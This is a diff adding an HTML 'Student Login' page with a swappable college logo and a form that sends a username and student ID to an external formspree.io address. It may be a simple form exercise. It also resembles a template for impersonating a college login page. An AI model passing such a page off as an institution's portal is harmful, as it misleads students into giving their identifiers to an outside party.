@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Student Login</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:#0d6efd;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:#fff;
+    padding:30px;
+    border-radius:12px;
+    width:350px;
+    text-align:center;
+    box-shadow:0 5px 15px rgba(0,0,0,0.3);
+}
+
+.logo{
+    width:100px;
+    margin-bottom:15px;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    margin:10px 0;
+    border-radius:6px;
+    border:1px solid #ccc;
+}
+
+button{
+    width:100%;
+    padding:10px;
+    background:#0d6efd;
+    color:#fff;
+    border:none;
+    border-radius:6px;
+    cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Replace with your college logo -->
+    <img src="logo.png" class="logo" alt="College Logo">
+
+    <h2>Student Information</h2>
+
+    <form action="https://formspree.io/f/mqevgowg" method="POST">
+
+        <input
+            type="text"
+            name="username"
+            placeholder="Enter Username"
+            required>
+
+        <input
+            type="text"
+            name="student_id"
+            placeholder="Enter Student ID"
+            required>
+
+        <button type="submit">Submit</button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
